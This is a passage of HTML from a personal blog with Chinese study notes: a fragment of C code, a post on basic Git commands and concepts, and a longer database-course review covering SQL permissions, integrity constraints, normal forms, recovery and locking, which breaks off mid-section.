i++)</span><br><span class="line">	&#123;</span><br><span class="line">		id = id * <span class="number">26</span> + s[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2021/01/26/Git/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2021/01/26/Git/" class="post-title-link" itemprop="url">Git</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-26 20:44:04" itemprop="dateCreated datePublished" datetime="2021-01-26T20:44:04+08:00">2021-01-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-17 16:50:11" itemprop="dateModified" datetime="2021-05-17T16:50:11+08:00">2021-05-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/Git/" itemprop="url" rel="index"><span itemprop="name">Git</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Git有工作区，暂存区，版本库三个概念</p>
<p><strong>工作区：</strong>是本地的项目目录</p>
<p><strong>暂存区(stage/index)：</strong>是进行操作时暂时存放文件的地方。他一般存放于==.git/index==中。其中.git是本地项目中的一个隐藏文件，他虽然在项目目录中但却不属于工作区。</p>
<p><strong>版本库：</strong>即==.git==目录</p>
<p>他们之间的关系如图所示：</p>
<p><img src="/project/2021/01/26/Git/%E5%9B%BE1.png"></p>
<p>其中objects是git的对象库，位于==.git/objects==目录下。</p>
<p>master分支即当前分支，也就是本地仓库，push到远程就是push的head指向的分支。</p>
<h2 id="Git创建仓库"><a href="#Git创建仓库" class="headerlink" title="Git创建仓库"></a>Git创建仓库</h2><p><strong>git init：</strong>使当前执行目录成为一个git仓库，会生成.git目录，一般是隐藏的</p>
<p><strong>git init newrepo：</strong>会在当前执行路径下创建newrepo并将其作为git仓库，即在newrepo中创建.git目录</p>
<blockquote>
<p>若当前目录中有其他的文件，需要将部分纳入版本控制，则使用==git add==命令告诉Git对这些文件进行跟踪，然后使用==git commit==提交</p>
</blockquote>
<p><strong>git clone repo：</strong>从现有的git仓库repo中拷贝项目</p>
<p><strong>git clone repo directory：</strong>将仓库拷贝到本地目录directory中</p>
<blockquote>
<p>Github中的ssh链接以.git结尾即是git仓库</p>
</blockquote>
<p><strong>git config：</strong>设置git</p>
<p><strong>git config –list：</strong>列出配置信息</p>
<p><strong>git config -e：</strong>修改配置文件（针对当前仓库）</p>
<p><strong>git config -e –global：</strong>修改配置文件（针对系统上所有仓库）</p>
<p><strong>git config –global user.name “xxx”：</strong>设置用户名（若去掉global只对当前仓库有效）</p>
<p><strong>git config –global user.email <a href="mailto:&#120;&#x78;&#x78;&#x78;&#x78;&#x40;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;">&#120;&#x78;&#x78;&#x78;&#x78;&#x40;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;</a>：</strong>设置用户邮箱信息（若去掉global只对当前仓库有效）</p>
<h2 id="Git基本操作"><a href="#Git基本操作" class="headerlink" title="Git基本操作"></a>Git基本操作</h2><p><img src="/project/2021/01/26/Git/%E5%9B%BE2.png"></p>
<p>有了==.git==之后就可以执行这些操作了</p>
<p><strong>git clone usr/ssh [newname]：</strong>将远程仓库拷贝到本地，不指定新名字则按照url中最后一个目录名</p>
<p><strong>git clone -b branch1 <a target="_blank" rel="noopener" href="http://www.github/sdfd.git%EF%BC%9A">www.github/sdfd.git：</a></strong>将远程仓库的分支branch1拷贝到本地</p>
<p><strong>git add [file1] [file2] …/ [dir] / . ：</strong>将本地文件存在缓冲区中，==.==代表全部文件</p>
<blockquote>
<p>git status -s可以获得仓库文件状态，用来查看文件是否添加到缓存，是否有修改等等</p>
<p>git diff可以查看文件在暂存区和工作区的差异</p>
</blockquote>
<p><strong>git commit -m [message]：</strong>将缓冲区的内容写入本地仓库</p>
<blockquote>
<p>此时如果git status则会看到==nothing to commit==,即表示上次提交后没有做任何改动</p>
<p>git log可以查看历史提交记录</p>
</blockquote>
<p><strong>git reset：</strong>可以指定退回某一次提交的版本</p>
<p><strong>git rm [–cached] file：</strong>将文件从暂存区和工作区删除，若加上cached则表示仅删除缓冲区中的文件</p>
<blockquote>
<p>-r表示递归删除，即file是目录的话</p>
<p>-f表示强制删除，如果要删除已修改并存于暂存区的文件的话需要使用</p>
</blockquote>
<p><strong>git fetch：</strong>将远程分支有本地分支没有的内容获取到本地仓库中</p>
<p><strong>git merge：</strong>将获取到的内容和本地分支合并</p>
<p><strong>git pull：</strong>即git fetch + git merge</p>
<p><strong>git remote add origin <code>https://github.com/xxx.git</code>：</strong>让origin指向远程库<br><strong>git push -u origin master：</strong>将origin的master分支和本地分支（当前分支）相关联</p>
<p><strong>git push：</strong>将本地分支上传到远程分支并合并</p>
<p><strong>git push [-f] origin main:branch1：</strong>把当前的本地分支（main）push到远程branch1中，比如合作者只能在branch1提交自己的代码，不能修改远程仓库中的main分支，当主管审核之后可以将branch1合并。-f表示强制，当远程分支和自己的内容不同，而你确定自己本地的是最新的，远程的是不需要的，则可以使用-f强制覆盖远程仓库。</p>
<blockquote>
<p>Github目前的主分支名不再是master而是main</p>
<p>所以可能有如下报错，将master改成main即可</p>
<p><img src="/project/2021/01/26/Git/%E5%9B%BE3.png"></p>
</blockquote>
<h2 id="Git分支管理"><a href="#Git分支管理" class="headerlink" title="Git分支管理"></a>Git分支管理</h2><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
<li><p>今天git clone的时候报错无法连接远程仓库，查找资料后解决办法为输入<code>ssh-agent bash</code>命令开启ssh代理。</p>
<p><img src="/project/2021/01/26/Git/%E5%9B%BE4.png"></p>
</li>
<li><p>git clone一个新的仓库无需git init，这样会导致外面文件夹有.git里面项目文件夹也有.git。git clone的时候会自动在项目文件夹里面创建.git</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2020/11/28/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2020/11/28/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/" class="post-title-link" itemprop="url">数据库</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-28 08:30:30" itemprop="dateCreated datePublished" datetime="2020-11-28T08:30:30+08:00">2020-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-17 16:00:56" itemprop="dateModified" datetime="2021-05-17T16:00:56+08:00">2021-05-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" itemprop="url" rel="index"><span itemprop="name">数据库</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h3><p><strong>数据库四个基本概念：</strong></p>
<p>数据（Data）——永久存储，有组织，可共享</p>
<p>数据库（Database），数据库管理系统（DBMS)，数据库系统（DBS）</p>
<p><strong>数据库（DB）的基本特征：</strong></p>
<ol>
<li>数据按一定的数据模型组织、描述和储存</li>
<li>可为各种用户共享</li>
<li>冗余度较小</li>
<li>数据独立性较高</li>
<li>易扩展</li>
</ol>
<p><strong>数据库管理系统(DBMS)：</strong></p>
<p><u>用途</u>：科学地组织和存储数据，高效地获取和维护数据</p>
<p><u>主要功能</u>：</p>
<ol>
<li>数据定义——提供数据定义语言（DDL），定义数据对象（table，view）</li>
<li>数据组织、存储和管理</li>
<li>数据操纵——提供数据操纵语言（DML），实现基本操作（增删改查）</li>
<li>数据库的事物管理和运行管理</li>
<li>数据库的建立和维护功能<ul>
<li>数据控制：</li>
<li>数据的安全性保护</li>
<li>数据的完整性检查</li>
<li>并发控制</li>
<li>数据库恢复</li>
</ul>
</li>
<li>其它</li>
</ol>
<p><u>优点</u>：简化了应用程序的编制，减少了应用程序的维护和修改</p>
<p><strong>数据库系统的构成：</strong></p>
<p>数据库、数据库管理系统（及其应用开发工具）、应用数据、数据库管理员</p>
<p><img src="/project/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F.png" alt="数据库系统"></p>
<p><strong>数据库系统的特点：</strong></p>
<ol>
<li>数据结构化——数据用数据模型描述</li>
<li>数据的共享性高，冗余度低且易扩充</li>
<li>数据独立性高——物理独立性（应用程序和物理存储独立），逻辑独立性（应用程序和逻辑结构独立）</li>
<li>数据由DBMS统一管理和控制——数据的安全性保护，数据的完整性检查、并发控制、数据库恢复</li>
</ol>
<p><u>文件系统</u>：共享性差、冗余度大、记录内有结构整体无结构、独立性差、所有文件副本必须同时更新</p>
<p><u>联系</u>：都是管理数据库的软件。操作系统可以解析文件系统，而数据库系统独立于操作系统。数据库系统的存储和组织是通过操作系统中的文件系统完成的。</p>
<p><strong>数据库系统的三级模式结构：</strong></p>
<p>数据的逻辑结构和物理结构变了，应用程序可以不变。</p>
<ol>
<li><p>模式（逻辑模式）：全体数据逻辑结构和特征的描述，所有用户的公共数据视图。一个数据库只有一个模式。包括：数据的逻辑结构、数据之间的联系、数据有关的安全性、完整性要求。</p>
<p>例：数据库中全部关系模式和约束集合</p>
</li>
<li><p>外模式（子模式，用户模式）：用户使用的局部逻辑结构，模式的子集。一个模式可以有多个外模式，一个外模式可以供给多个应用程序</p>
<p>用途：支持不同用户建立适应局部应用特征的结构，简化应用处理，提高安全性</p>
</li>
<li><p>内模式（存储模式）：数据的物理结构和存储方式的描述。一个数据库只有一个。独立于存储设备。</p>
</li>
</ol>
<p><strong>数据库的二级映像功能：</strong></p>
<ol>
<li>外模式/模式映像：模式改变时对映像做改变使外模式不变，保证了数据与程序的逻辑独立性(多个)</li>
<li>模式/内模式映像：当存储结构改变，修改映像使模式不变，保证了数据与程序的物理独立性(唯一)</li>
</ol>
<p>保证了数据库外模式的稳定性，从底层保证了应用程序的稳定性。</p>
<p><strong>数据模型：</strong></p>
<p>数据结构、数据操作、数据的完整性约束条件</p>
<ol>
<li>概念模型<ul>
<li>按用户的观点对数据和信息建模</li>
</ul>
</li>
<li>逻辑模型和物理模型<ul>
<li>逻辑模型：网状模型、层次模型、关系模型等，按计算机系统的观点对数据建模，用于DBMS实现</li>
<li>物理模型：数据在系统内部（磁盘或磁带）的表示方法和存取方法</li>
</ul>
</li>
</ol>
<p><strong>层次模型：</strong></p>
<p>树形，根节点之外的其他结点有且只有一个双亲结点</p>
<ul>
<li>只能处理一对多的实体联系</li>
<li>任何记录只有按路径查看才能显出全部意义</li>
<li>没有一个子女记录能脱离双亲记录而存在</li>
</ul>
<p>完整性约束：</p>
<ul>
<li>无相应的双亲结点值就不能插入子女结点值</li>
<li>如果删除双亲结点子女结点也同时删除</li>
<li>更新操作应更新所有相应记录</li>
</ul>
<p>优点：</p>
<ul>
<li>数据结构简单清晰</li>
<li>查询效率高，优于关系模型不低于网状模型</li>
<li>有良好的完整性支持</li>
</ul>
<p>缺点：</p>
<ul>
<li>多对多联系表示不自然</li>
<li>对插入删除限制多</li>
<li>查询子女必须通过双亲</li>
</ul>
<p><strong>网状模型：</strong></p>
<p>允许无双亲和多个双亲，一对多</p>
<p>优点：</p>
<ul>
<li>能更直接的描述现实世界</li>
<li>具有良好的性能</li>
</ul>
<p>缺点：</p>
<ul>
<li>结构复杂</li>
<li>DDL,DML语言复杂</li>
<li>用户需要了解系统结构的细节</li>
</ul>
<p><strong>关系模型：</strong></p>
<ul>
<li>候选码：一组属性能唯一标识一个元组，而其子集不能</li>
<li>主属性：候选码的属性，一组则是一组属性</li>
<li>主码：选定的一个候选码</li>
<li>域：一组具有相同数据类型的值的集合</li>
<li>分量：元组中一个属性值</li>
<li>关系模式：对关系的描述（“学生（学号，姓名，……）”）</li>
</ul>
<p>规范条件：关系的每一个分量必须是不可分的数据项</p>
<p>关系的完整性：</p>
<ol>
<li><p>实体完整性</p>
<p>主属性不能取空值</p>
</li>
<li><p>参照完整性</p>
<p>当另一个关系S的主码Ks成为一个关系R的属性F（非码属性），则F是R的外码，R为参照关系，S为被参照关系。</p>
<p>R中的每个元组在F上的值必须：要么取空值，要么等于S中某个元组的主码（Ks）值。</p>
</li>
<li><p>用户定义的完整性</p>
</li>
</ol>
<p>优点：</p>
<ul>
<li>建立在严格的数学概念基础上</li>
<li>概念单一（实体和联系以及结果都用关系表示）</li>
<li>关系模型的存取路径对用户透明（数据独立性高，安全性高，简化程序员工作）</li>
</ul>
<p>缺点：</p>
<ul>
<li>存取路径对用户透明，查询效率往往不如格式化数据</li>
<li>为提高性能必须对查询请求优化，增加管理难度</li>
</ul>
<p><strong>数据模型的组成要素：</strong></p>
<p>数据结构（静态特性）、数据操作（动态特性）、数据的完整性约束条件</p>
<h3 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h3><p><strong>关系操作：</strong>查询——<strong>选择、投影</strong>、连接、除、<strong>并、差</strong>、交、<strong>笛卡尔积</strong></p>
<p>sql——数据定义语言、数据操纵语言、数据控制语言</p>
<p>关系相容：具有相同的度且两者第i个属性来自同一个域</p>
<h3 id="数据库安全性"><a href="#数据库安全性" class="headerlink" title="数据库安全性"></a>数据库安全性</h3><p><strong>实现数据库系统安全性的技术和方法：</strong></p>
<p><u>用户身份认证、访问/存取控制技术</u>、视图技术、审计技术、数据加密存储和加密传输</p>
<p><strong>访问控制流程：</strong></p>
<ol>
<li><p>DBMS对提出访问请求的数据库用户进行身份认证</p>
<ul>
<li><p>用户身份认证：用户标识——用户名+UID</p>
<p>静态口令认证、动态口令认证、生物特征认证、智能卡认证</p>
</li>
</ul>
</li>
<li><p>在处理层进行自主访问控制和强制访问控制</p>
<ul>
<li>访问控制：定义用户权限+合法权限检查——访问控制子系统</li>
<li>自主访问控制（DAC）：不同用户对不同的对象有不同权限，用户可以将权限授予他人</li>
<li>强制访问控制（MAC）：每个数据对象标定一个密级，每个用户授予一个级别的许可证，根据级别访问</li>
</ul>
</li>
<li><p>对用户访问行为和关键操作进行审计，对异常用户行为进行简单入侵检测</p>
</li>
</ol>
<p><strong>自主访问控制方法：</strong></p>
<ol>
<li>GRANT<ul>
<li>GRANT select/all priviliges/update(Sno) ON TABLE sc,course TO u1,u2/public [WITH GRANT OPTION];</li>
</ul>
</li>
<li>REVOKE<ul>
<li>REVOKE select ON TABLE sc FROM u1 [CASCADE/RESTRICT];</li>
</ul>
</li>
<li>创建用户<ul>
<li>CREATE USER u1 [WITH] [DBA|RESOURCE|CONNECT];</li>
<li>CONNECT:默认权限，只能登陆数据库</li>
<li>RESOURCE:能创建基本表和视图，不能创建模式、新用户</li>
<li>DBA:啥都能干</li>
</ul>
</li>
<li>数据库角色——权限的集合<ul>
<li>CREATE ROLE r1；</li>
<li>GRANT select ON TABLE student TO r1;//可重复使用该句增加r1权限</li>
<li>GRANT r1 TO u1,r2 [WITH ADMIN OPTION];//授予者是r1权限拥有者</li>
<li>REVOKE r1 FROM u1;//可重复使用该句收回r1某个权限</li>
</ul>
</li>
</ol>
<p><strong>强制访问控制方法：</strong></p>
<p>敏感度标记：TS&gt;=S&gt;=C&gt;=P</p>
<p>主体的许可证级别<strong>大于或等于</strong>客体的密级时，才能<strong>读</strong>客体</p>
<p>主体的许可证级别<strong>小于或等于</strong>客体的密级时，才能<strong>写</strong>客体</p>
<p>实现强制访问控制时首先要实现自主访问控制</p>
<p><strong>视图机制：</strong></p>
<p>把要保密的数据对用户隐藏，间接支持存取谓词的用户权限定义</p>
<p>CREATE VIEW v1 AS (select * from student where sdept=’cs’);</p>
<p>GRANT select ON v1 TO u1;</p>
<p><strong>审计（AUDIT）：</strong></p>
<ul>
<li>AUDIT update ON sc;</li>
<li>NOAUDIT update ON sc;</li>
</ul>
<p><strong>数据加密：</strong></p>
<ol>
<li>存储加密<ul>
<li>透明存储加密<ul>
<li>内核级加密保护方式，对用户完全透明</li>
<li>数据写到磁盘时加密，授权用户读取时解密。</li>
<li>应用程序只需在创建表语句中说明加密的字段即可</li>
</ul>
</li>
<li>非透明存储加密<ul>
<li>通过多个加密函数实现</li>
</ul>
</li>
</ul>
</li>
<li>传输加密<ul>
<li>链路加密<ul>
<li>在链路层进行</li>
<li>报文和报头均加密</li>
</ul>
</li>
<li>端到端加密<ul>
<li>发送端加密，接收端解密</li>
<li>只加密报文</li>
<li>所需密码设备数量较少，容易被非法监听者发现并获取敏感信息</li>
</ul>
</li>
<li>基于安全套接层协议(SSL)传输方案的实现思路<ul>
<li>确认通信双方端点的可靠性</li>
<li>协商加密算法和密钥</li>
<li>可靠数据传输</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>其他安全性保护：</strong></p>
<ol>
<li><p>推理控制</p>
<ul>
<li>基于函数依赖的推理控制</li>
<li>基于敏感关联的推理控制</li>
</ul>
</li>
<li><p>隐蔽信道</p>
</li>
<li><p>数据隐私保护</p>
</li>
</ol>
<h3 id="数据库完整性"><a href="#数据库完整性" class="headerlink" title="数据库完整性"></a>数据库完整性</h3><p><strong>实体完整性</strong>——主属性不能取空值且能唯一标识元组</p>
<ol>
<li>列级定义：create table字段后加 PRIMARY KEY</li>
<li>表级定义：create table sc( xxxxx, PRIMARY KEY(Sno,Cno));</li>
<li>检查和违约处理：<ul>
<li>检查主码值是否唯一，不唯一则拒绝插入or修改（全表扫描/在主码上建立索引）</li>
<li>检查主码是否为空，有一个为空则拒绝插入or修改</li>
</ul>
</li>
</ol>
<p><strong>参照完整性</strong></p>
<ol>
<li>表级：create table sc( xxxxx, FOREIGN KEY(Sno) REFERENCES student(Sno) [ON DELETE CASCADE ] [ON UPDATE NO ACTION]);</li>
<li>检查和违约处理：<ul>
<li>sc表中增加or修改了Sno不在student中的元组——拒绝</li>
<li>student表中删除or修改了一些元组使sc表中一些Sno无法在studnet中找到——拒绝NO ACTION/级联删除or修改CASCADE/设置为空SET NULL</li>
</ul>
</li>
</ol>
<p><strong>用户定义的完整性</strong></p>
<ol>
<li>属性上的：NOT NULL,UNIQUE（可以为空）,CHECK</li>
<li>元组上的：CHECK (Ssex=’女’ OR Sname NOT LIKE ‘Ms.%’)</li>
<li>检查和违约处理：拒绝</li>
</ol>
<p><strong>完整性约束命名子句</strong></p>
<ol>
<li>create table sc( xxxxx, CONSTRAINT C1 FOREIGN KEY(Sno) REFERENCES student(Sno) [ON DELETE CASCADE ] [ON UPDATE NO ACTION]);</li>
<li>ALTER TABLE sc DROP/ADD CONSTRAINT C1 xxx;</li>
</ol>
<p><strong>断言</strong></p>
<p>不满足断言为真值的语句会被拒绝执行</p>
<ol>
<li>CREATE ASSERTION A1 CHECK(60 &gt;= (select xxxxx))//可以设置子句，比表级约束更具一般性</li>
<li>DROP ASSERTION A1;</li>
</ol>
<p><strong>触发器</strong></p>
<p>触发器保存在数据库服务器中</p>
<p>触发器只能定义在基本表上，表的拥有者才可以创建触发器，触发器和表必须在同一个模式下，同一个模式中触发器名唯一。</p>
<ol>
<li><p>CREATE TRIGGER T1 BEFORE/AFTER update OR insert [OF grade] ON sc FOR EACH ROW/STATEMENT [WHEN(xxx)] [BEGIN] 命令语句 [END];</p>
</li>
<li><p>注：如果是row级触发器，在过程体中可以使用new和old引用事件之后的新值和事件之前的旧值。</p>
</li>
<li><p>如果触发器动作体执行失败，激活触发器的事件就会停止执行，触发器可能影响的其他对象不发生任何变化。</p>
</li>
<li><p>DROP TRIGGER T1 ON sc;//只能由有权限的用户删除</p>
</li>
</ol>
<h3 id="关系数据库理论"><a href="#关系数据库理论" class="headerlink" title="关系数据库理论"></a>关系数据库理论</h3><p>关系模式R&lt;U,F&gt;：U一组属性，F属性组上的数据依赖（D，DOM——域和属性向域的映像）</p>
<p><u>好的关系模式</u>：尽可能少数据冗余、没有更新异常、没有插入异常、没有删除异常</p>
<p><strong>函数依赖：</strong></p>
<p>$X \rightarrow Y$: X函数确定Y/Y函数依赖于X</p>
<p>$X \leftrightarrow Y$: $X\rightarrow Y$ 且 $Y \rightarrow X$</p>
<p>$X \nrightarrow Y$: Y不函数依赖于X</p>
<p>$X \rightarrow Y$ 且 $Y \not\subseteq X$ : 非平凡函数依赖</p>
<p>$X \rightarrow Y$ 且 $Y \subseteq X$ : 平凡函数依赖，恒成立</p>
<p>$ X\stackrel{F}{\longrightarrow} Y$ :  Y对X完全函数依赖（X能决定Y，但是X的任意真子集都不能决定Y）</p>
<p>$ X\stackrel{P}{\longrightarrow} Y$ : Y对X部分函数依赖（X能决定Y，但不是完全函数依赖）</p>
<p>$ X\stackrel{传递}{\longrightarrow} Z$ ：Z对X传递函数依赖：X决定Y（非平凡）且Y不能决定X，Y决定Z（非平凡）</p>
<p><strong>范式：</strong></p>
<p><img src="/project/1606916927528.png" alt="1606916927528"></p>
<ol>
<li><p>1NF——每个属性不可再分（规范化关系）</p>
<p>问题：数据冗余、插入异常、删除异常、更新复杂</p>
<p>原因：非主属性对候选码有部分函数依赖（依赖于候选码的子集）</p>
</li>
<li><p>2NF——1NF+每个非主属性完全依赖于所有候选码</p>
<p>问题：数据冗余、插入异常、删除异常、更新复杂（只解决了部分）</p>
<p>原因：非主属性对候选码的传递依赖</p>
<p>推论：1NF+候选码为单个属性=2NF</p>
</li>
<li><p>3NF——1NF+没有非主属性对码的传递依赖</p>
<p>问题：数据冗余、插入异常、删除异常、更新复杂（只解决了部分）</p>
<p>原因：主属性对候选码部分依赖和传递依赖</p>
<p>推论：3NF必是2NF；2NF+至多一个非主属性=3NF；二元关系必是3NF</p>
</li>
<li><p>BCNF——1NF+每一个决定属性集都含有码</p>
<p>实现彻底分离，消除异常</p>
</li>
</ol>
<h3 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h3><p><strong>基本步骤：</strong></p>
<ol>
<li><p>需求分析</p>
<p>数据字典：数据流图中数据的描述，在需求分析阶段建立，不断修改完善。是进行详细数据收集和分析的结果。包括，数据项、数据结构、数据流、数据存储、处理过程。</p>
</li>
<li><p>概念结构设计</p>
<p>将需求抽象为概念模型。</p>
</li>
<li><p>逻辑结构设计</p>
<p>ER图变关系模型：一个实体型一个关系模式，一个联系一个关系模式（单独一个：各实体的码+联系的属性；和某端合并：加上对方的码和联系的属性），具有相同码的关系模式可以合并</p>
<p>数据模型优化：确定数据依赖，对依赖分析优化</p>
</li>
<li><p>物理结构设计</p>
<p>物理结构：数据库在物理设备上的存储结构（设计存放位置）和存取方法（索引）</p>
<p>评价方案：存储空间、存取时间、维护代价</p>
</li>
<li><p>数据库实施</p>
<p>数据载入，数据库试运行（分期入库，转储恢复）</p>
</li>
<li><p>数据库运行和维护</p>
<p>转储恢复，安全性完整性控制、性能监督分析改进、数据库的重组织和重构造</p>
</li>
</ol>
<p><strong>ER图冲突：</strong></p>
<ul>
<li>属性冲突——同一属性的域定义冲突</li>
<li>命名冲突——不同意义相同名字，相同意义不同名字</li>
<li>结构冲突——同一对象在不同应用中具有不同的抽象</li>
</ul>
<h3 id="数据库恢复技术"><a href="#数据库恢复技术" class="headerlink" title="数据库恢复技术"></a>数据库恢复技术</h3><p><strong>事物：</strong></p>
<p>BEGIN TRANSACTION</p>
<p>xxx</p>
<p>COMMIT;//提交事务所有操作，更新写入磁盘中</p>
<p>ROLLBACK;//事务异常终止，撤销更新操作，回滚到事务开始时状态</p>
<p><strong>ACID</strong></p>
<ul>
<li><p>原子性——数据库的逻辑工作单位，事务中操作要么都做要么都不做</p>
</li>
<li><p>一致性——事务的执行从一个一致性状态转移到另一个一致性状态（只包含事务提交的结果）</p>
</li>
<li><p>隔离性——一个事务的执行不能被其他事务干扰</p>
</li>
<li><p>持续性——一个事务一旦提交，他对数据的改变就是永久的。</p>
</li>
</ul>
<p><strong>故障的种类：</strong></p>
<ol>
<li><p>事务内部的故障</p>
<p>恢复：事务撤销（UNDO），强行回滚该事务</p>
</li>
<li><p>系统故障（软故障）</p>
<p>后果：正在运行的事务非正常终止，不破坏数据库、内存中缓冲区信息丢失</p>
<p>恢复：UNDO所有未完成的事物，REDO所有已提交的事务</p>
</li>
<li><p>介质故障（硬故障）</p>
<p>后果：破坏部分数据库，影响正在存取这部分数据的所有事务</p>
<p>恢复：装入数据副本，REDO成功事务</p>
</li>
<li><p>计算机病毒</p>
</li>
</ol>
<p><strong>恢复的实现技术：</strong></p>
<ol>
<li><p>数据转储</p>
<p>数据库管理员定期将整个数据库复制到磁带、磁盘或其他存储介质上保存起来的过程。备用的数据文本称为后备副本。</p>
<ul>
<li><p>静态转储</p>
<p>在系统中无运行事务时转储。转出开始时数据库处于一致性装填，转储期间不允许对数据库存取修改。得到的一定是数据一致性的副本。</p>
<p>优点：实现简单</p>
<p>缺点：降低数据库可用性</p>
</li>
<li><p>动态转储</p>
<p>转储和事务并发进行</p>
<p>优点：不用等待</p>
<p>缺点：不能保证副本数据正确有效</p>
<p>需要用日志文件记录转储操作期间对数据库的修改操作。副本+日志文件。</p>
</li>
<li><p>海量转储：转储全部数据库</p>
</li>
<li><p>增量转储：只转储上次转储后更新过的数据</p>
</li>
<li><p>对比：海量恢复起来更方便，数据库很大事务处理频繁则增量有效。</p>
</li>
</ul>
</li>
<li><p>登记日志文件</p>
<p>记录事务对数据库更新操作的文件</p>
<p>登记的顺序必须严格按并发事务执行时间次序；必须先写日志文件，后写数据库。</p>
<p>用缓冲区临时保存日志，根据需要一次写入多个缓冲块到磁盘。</p>
<ul>
<li><p>以记录为单位——记录事务的开始（begin）结束（commit；rollback）以及所有更新操作。</p>
<p>事务标识、操作类型、操作对象、更新前数据旧值、更新后数据新值。</p>
</li>
<li><p>以数据块为单位</p>
<p>事务标识、被更新的数据块。</p>
</li>
</ul>
<p>作用：</p>
<ul>
<li>事务故障恢复、系统故障恢复、介质故障恢复</li>
<li>动态转储必须建立日志文件，静态转储也可以建立日志文件</li>
</ul>
</li>
</ol>
<h3 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h3><p><strong>并发操作带来的不一致性：</strong></p>
<p>并发操作破坏了数据的隔离性</p>
<ul>
<li><p>丢失修改</p>
<p>后来的写入覆盖了之前的修改</p>
</li>
<li><p>不可重复读</p>
<p>T1读取数据后T2对数据进行了更新（修改、删除、插入），T1没法再次读到原来数据</p>
</li>
<li><p>读“脏”数据</p>
<p>T1修改数据写入磁盘，T2读取，T1撤销修改将数据恢复原值，此时T2的数据就是“脏”数据</p>
</li>
</ul>
<p><strong>并发控制主要技术：</strong></p>
<p>封锁、时间戳、乐观控制法、多版本并发控制</p>
<p><strong>封锁：</strong></p>
<p>操作前先加锁</p>
<ol>
<li><p>排他锁（X/写锁）</p>
<p>只允许加锁者读取和修改，其他事务不能再加锁，也不能读和修改。</p>
</li>
<li><p>共享锁（S/读锁)</p>
<p>加锁者可以读不能修改，其他事务只能加S锁不能加X锁，都只能读。</p>
</li>
</ol>
<p><strong>封锁协议：</strong></p>
<ol>
<li><p>一级封锁协议</p>
<p>事务在修改数据前必须加X锁，结束才能释放。</p>
<p>防止丢失修改，不保证可重复读和不读脏数据</p>
</li>
<li><p>二级封锁协议</p>
<p>一级+事务在读之前必须加S锁，读完释放。</p>
<p>防止丢失修改、读脏数据，不保证可重复读</p>
</li>
<li><p>三级封锁协议</p>
<p>一级+事务在读之前必须加S锁，事务结束才释放。</p>
</li>
</ol>
<p><strong>活锁：</strong></p>
